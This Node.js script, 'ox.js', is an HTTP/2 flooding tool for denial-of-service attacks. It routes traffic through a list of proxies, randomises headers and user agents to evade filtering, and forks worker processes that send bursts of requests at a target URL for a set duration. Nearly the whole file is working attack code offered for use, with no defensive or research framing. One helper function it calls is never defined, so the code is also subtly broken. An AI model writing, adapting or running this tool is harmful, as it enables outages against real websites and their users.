const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const { EventEmitter } = require("events");

// Language and encoding headers
const langHeader = [
    'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7', 
    'es-ES,es;q=0.9,gl;q=0.8,ca;q=0.7',
    'ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7',
    'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
    'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'zh-TW,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6',
    'nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7',
    'fi-FI,fi;q=0.9,en-US;q=0.8,en;q=0.7',
    'sv-SE,sv;q=0.9,en-US;q=0.8,en;q=0.7',
    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7'
];

const encodingHeader = [
    'gzip, deflate, br',
    'compress, gzip',
    'deflate, gzip',
    'gzip, identity',
    '*'
];

process.setMaxListeners(0);
EventEmitter.defaultMaxListeners = 0;

process.on('uncaughtException', () => {});

if (process.argv.length < 7) {
    console.log(`Usage: node ox.js <target> <time> <rate> <threads> <proxyFile>`);
    process.exit(1);
}

const args = {
    target: process.argv[2],
    time: Number(process.argv[3]),
    rate: Number(process.argv[4]),
    threads: Number(process.argv[5]),
    proxyFile: process.argv[6]
};

const headers = {};
const proxies = fs.readFileSync(args.proxyFile, "utf-8").split(/\r?\n/);
const parsedTarget = url.parse(args.target);

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min)) + min;
}

function randomElement(elements) {
    return elements[randomInt(0, elements.length)];
}

function getRandomUserAgent() {
    const osList = ['Windows NT 10.0', 'Windows NT 6.1', 'Windows NT 6.3', 'Macintosh', 'Android', 'Linux'];
    const browserList = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera'];
    const languageList = ['en-US', 'en-GB', 'fr-FR', 'de-DE', 'es-ES'];
    const countryList = ['US', 'GB', 'FR', 'DE', 'ES'];
    const manufacturerList = ['Apple', 'Google', 'Microsoft', 'Mozilla', 'Opera Software'];

    const os = randomElement(osList);
    const browser = randomElement(browserList);
    const language = randomElement(languageList);
    const country = randomElement(countryList);
    const manufacturer = randomElement(manufacturerList);
    const version = randomInt(1, 101);

    return `${manufacturer}/${browser} ${version}.${version}.${version} (${os}; ${country}; ${language})`;
}

class NetSocket {
    HTTP(options, callback) {
        const payload = `CONNECT ${options.address} HTTP/1.1\r\nHost: ${options.address}\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true
        });

        connection.setTimeout(options.timeout);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            if (response.includes("HTTP/1.1 200")) {
                callback(connection);
            } else {
                connection.destroy();
                callback(undefined, "error: invalid response from proxy server");
            }
        });

        connection.on("timeout", () => {
            connection.destroy();
            callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", err => {
            connection.destroy();
            callback(undefined, err.message);
        });
    }
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const [proxyHost, proxyPort] = proxyAddr.split(":");
    
    headers[":method"] = "GET";
    headers[":path"] = parsedTarget.path;
    headers[":scheme"] = "https";
    headers[":authority"] = randomString(10) + "." + parsedTarget.host;
    headers["accept"] = randomElement(langHeader);
    headers["accept-encoding"] = randomElement(encodingHeader);
    headers["accept-language"] = randomElement(langHeader);
    headers["connection"] = Math.random() > 0.5 ? "keep-alive" : "close";
    headers["upgrade-insecure-requests"] = Math.random() > 0.5 ? "1" : "0";
    headers["x-requested-with"] = "XMLHttpRequest";
    headers["pragma"] = Math.random() > 0.5 ? "no-cache" : "max-age=0";
    headers["cache-control"] = Math.random() > 0.5 ? "no-cache" : "max-age=0";
    headers["user-agent"] = getRandomUserAgent();

    const proxyOptions = {
        host: proxyHost,
        port: Number(proxyPort),
        address: `${parsedTarget.host}:443`,
        timeout: 100
    };

    const header = new NetSocket();

    header.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            console.error(error);
            return;
        }

        connection.setKeepAlive(true, 60000);

        const tlsOptions = {
            ALPNProtocols: ['h2', 'http/1.1'],
            ecdhCurve: "GREASE:X25519:x25519",
            ciphers: "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
            rejectUnauthorized: false,
            socket: connection,
            honorCipherOrder: true,
            secure: true,
            port: 443,
            servername: parsedTarget.host,
            secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method"],
            secureOptions: crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
                crypto.constants.SSL_OP_NO_TICKET |
                crypto.constants.SSL_OP_NO_COMPRESSION |
                crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
                crypto.constants.SSL_OP_NO_SSLv2 |
                crypto.constants.SSL_OP_NO_SSLv3 |
                crypto.constants.SSL_OP_NO_TLSv1 |
                crypto.constants.SSL_OP_NO_TLSv1_1
        };

        const tlsConn = tls.connect(tlsOptions);

        tlsConn.setKeepAlive(true, 60000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 1000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 262144,
                enablePush: false
            },
            createConnection: () => tlsConn,
            socket: connection
        });

        client.on("connect", () => {
            setInterval(() => {
                for (let i = 0; i < args.rate; i++) {
                    const request = client.request(headers);

                    request.on("response", () => {
                    request.close();
                        request.destroy();
                    });

                    request.end();
                }
            }, 1000);
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
        });

        client.on("error", err => {
            client.destroy();
            connection.destroy();
            console.error("Client error:", err.message);
        });
    });
}

// Start the flooder with the specified number of threads
if (cluster.isMaster) {
    console.clear();
    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }
    
    setTimeout(() => {
        process.exit(1);
    }, args.time * 1000);

} else {
    setInterval(runFlooder, 1000);
}

// Graceful exit handling
process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
    process.exit(1);
});

process.on('unhandledRejection', (err) => {
    console.error('Unhandled Rejection:', err);
    process.exit(1);
});
                    